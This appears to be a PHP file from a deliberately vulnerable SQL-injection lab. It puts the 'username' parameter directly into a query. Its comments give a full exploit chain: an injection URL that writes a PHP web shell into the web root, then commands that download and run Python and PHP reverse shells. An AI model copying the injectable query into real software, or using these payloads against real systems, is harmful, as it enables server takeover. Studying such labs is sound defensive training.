<?php

    require '../functions.php';
    require '../config.php';

    // Create a PHP script that will run commands
    // http://secure.api/sql-injection/outfile.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;
    //
	// PYTHON BACKDOOR
	//
    // Download Python reverse shell
    // http://secure.api/images/cmd.php?cmd=wget%20http://secure.api/scripts/reverse-shell.py -O /tmp/reverse-shell.py
    //
    // Run new Python backdoor script
    // http://secure.api/images/cmd.php?cmd=/tmp/reverse-shell.py
    //
	// PHP BACKDOOR - tbc
    //
    // Download PHP reverse shell
    // http://secure.api/images/cmd.php?cmd=wget%20http://secure.api/scripts/reverse-shell.php -O /tmp/reverse-shell.php
    // 
    // Run new PHP backdoor script
    // http://secure.api/images/cmd.php?cmd=python /tmp/reverse-shell.php
    // 

    //file_put_contents('/var/www/web/sql-injection/dump/fpc.txt', "file put contents 2\n");

    $username = isset($_GET['username']) ? $_GET['username'] : null;

    $sql = "SELECT * FROM user WHERE username='$username'";

    try {
        $stmt = $db->prepare($sql);
        $stmt->execute();
    } catch(PDOException $ex) {
        echo "Some error occured: $sql\n";
        dd($ex->getMessage());
    }

    $results = $stmt->fetchAll();

    dd($results);




